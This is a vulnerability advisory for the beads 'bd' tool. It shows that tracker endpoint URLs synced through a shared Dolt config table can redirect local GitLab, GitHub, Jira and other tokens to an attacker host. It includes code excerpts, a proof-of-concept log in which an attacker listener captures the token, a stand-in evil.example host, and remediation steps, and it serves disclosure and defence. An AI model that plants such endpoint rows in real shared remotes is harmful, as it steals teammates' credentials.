# Synced config-Table Tracker Endpoint Rows Redirect Local Integration Credentials to Attacker-Controlled Servers on beads

| Field | Value |
|---|---|
| Project | [gastownhall/beads](https://github.com/gastownhall/beads) |
| Vulnerability Type | Credentials Management (CWE-255) / Trust Boundary Violation (CWE-501), same class as CVE-2020-5260 |
| Severity | Medium — CVSS 3.1 Base Score: 5.7 |
| CVSS Vector | `AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N` |
| Affected Versions | Main branch (verified on a build of commit `70887e7`, 2026-10-14); same design in release v1.3.1 (2026-09-30) |
| Authentication | Attacker needs write access to any remote the victim pulls (team remote, federation peer, compromised collaborator); victim's secret stays local |

---

## Summary

`bd` stores the API endpoint configuration of external tracker integrations — `gitlab.url`, `jira.url`, `github.url`, `linear.api_endpoint` and peers — in the Dolt database `config` table. That table is a **synced table**: `bd dolt push`/`pull`, `DOLT_CLONE` and `DOLT_PULL` replicate every row, by design. The matching credentials, by contrast, are deliberately kept local (`config.yaml` / environment) and are never synced. When a tracker initializes, the endpoint URL is read from the database (attacker-influencable through any remote the victim syncs with) and the token from the local file — the two are then combined into one authenticated client.

There is no origin or allow-list validation on the endpoint at the point of use. The only check, `validateGitLabConfig` in `cmd/bd/gitlab.go`, rejects cleartext `http://` to non-local hosts — but accepts **any** `https://` URL (and `http://localhost`/`http://127.0.0.1`). An attacker who controls a remote that the victim pulls — a shared open-source issue database, a federation peer, or a compromised teammate's push — can therefore plant `gitlab.url = https://evil.example` in the synced table, and the victim's next `bd gitlab sync` sends their real GitLab token as the `PRIVATE-TOKEN` header to the attacker's server. The same split holds for the GitHub, Jira, Linear, ADO and Notion integrations (`internal/gitlab/tracker.go`, `internal/gitlab/client.go` string-concatenate the URL with no host checks).

## Details

Tracker initialization reads endpoint and secret from different trust domains — `internal/gitlab/tracker.go` (`Init`) and `cmd/bd/gitlab.go` (`getGitLabConfigValue`):

```go
// Secret/yaml-only keys ... live in config.yaml, not the Dolt database ...
if config.IsYamlOnlyKey(key) { return config.GetString(key) ... }
// non-secret keys: the synced store first
val, err := t.store.GetConfig(ctx, key)        // gitlab.url: the DATABASE row
```

```go
baseURL, _ := t.getConfig(ctx, "gitlab.url", "GITLAB_URL")
...
t.client = NewClient(token, baseURL, projectID)  // local token + synced URL
```

The URL reaches the wire via plain concatenation (`internal/gitlab/client.go`), with the token attached as a header. The scheme guard that exists (`cmd/bd/gitlab.go`):

```go
// Reject non-HTTPS URLs to prevent sending tokens in cleartext.
// Allow http://localhost and http://127.0.0.1 for local development/testing.
if strings.HasPrefix(config.URL, "http://") &&
    !strings.HasPrefix(config.URL, "http://localhost") &&
    !strings.HasPrefix(config.URL, "http://127.0.0.1") {
    return fmt.Errorf("gitlab.url must use HTTPS ...")
}
```

— cannot distinguish `https://gitlab.com` from `https://evil.example`, so it is not a boundary against attacker-controlled endpoints, and it is not applied to the other trackers' URL handling at all.

## PoC

Verified on a build of main `70887e7` (server-mode workspace). The attacker's endpoint rows were planted in the synced `config` table exactly as a `bd dolt pull` from an attacker-controlled remote would replicate them; the victim's secret was kept local (`GITLAB_TOKEN` env, the documented local-secret channel). The attacker HTTP endpoint and the victim's `bd gitlab sync` ran in one process.

**Step 1 — negative control: the only endpoint guard rejects non-local cleartext URLs:**

```
[*] control sync vs http://evil.example.com -> rc=1
    Error: gitlab.url must use HTTPS (got "http://evil.example.com"). Use HTTPS to protect your access token
```

**Step 2 — the attacker rows arrive through the synced table (as after `bd dolt pull`):**

```
[*] synced config row: gitlab.project_id = 42
[*] synced config row: gitlab.url = http://127.0.0.1:18101
```

(`http://127.0.0.1` is used here because the scheme guard whitelists loopback for local development; `https://evil.example` passes the same guard unchanged and is the real-world variant.)

**Step 3 — victim syncs; the attacker endpoint receives the local token:**

```
[ATTACKER LISTENER] GET /api/v4/projects/42/issues?page=1&per_page=100&updated_after=2026-10-14T11%3A16%3A22Z
[ATTACKER LISTENER] PRIVATE-TOKEN header: 'glpat-VICTIM-SECRET-DO-NOT-LEAK'
[*] victim sync (token local, url from synced table) -> rc=0
[+] VERDICT: victim GitLab token delivered to attacker-controlled endpoint
[+] 1 request(s) carried PRIVATE-TOKEN: glpat-VICTIM-SECRET-DO-NOT-LEAK
```

**Real-environment reproduction** (the product itself, run for this test): the built `bd` binary executed `bd gitlab sync` against a live workspace whose synced `config` table carried the attacker URL; the binary's own HTTP client delivered the victim's token to the attacker endpoint in the `PRIVATE-TOKEN` header.

![Real-environment verification](beads_synced_tracker_endpoint_hijack.png)

---

## Impact

Whoever controls (or compromises) any remote a team pulls from can harvest every member's live tracker credentials: GitLab PATs, GitHub tokens, Jira tokens, Linear keys, Notion tokens. The theft requires no code execution on the victim — one `bd dolt pull` plants the row, and the next scheduled or manual `bd gitlab sync` (or the equivalent per-tracker command) exfiltrates the secret over an HTTPS channel that looks legitimate. Stolen tokens typically grant repository and project write access well beyond the beads workspace, and the attack scales to every consumer of a popular shared remote. This is the same credential-redirection class as CVE-2020-5260 (Git sending credentials to HTTP servers), with the added twist that the malicious "configuration file" arrives through the product's own sync mechanism.

### Remediation

1. Do not read integration endpoints from the synced table: treat URL/endpoint keys (`gitlab.url`, `jira.url`, `github.url`, `linear.api_endpoint`, …) as `YamlOnlyKeys`-style local configuration, or require explicit per-workspace confirmation before a newly-synced endpoint value is used for authenticated traffic.
2. Enforce an origin policy at the client layer for trackers with fixed public hosts (gitlab.com, api.github.com, …): allow-list the known hosts and require interactive approval for any other host, rather than accepting arbitrary `https://` URLs.
3. Pin the credential to the origin: remember which host each token was configured against and refuse to send it to a different host, so a swapped URL alone can never redirect authentication.
4. On pull/clone, surface synced-table diffs for endpoint keys to the user ("`gitlab.url` changed to X by remote Y") before they take effect in authenticated requests.
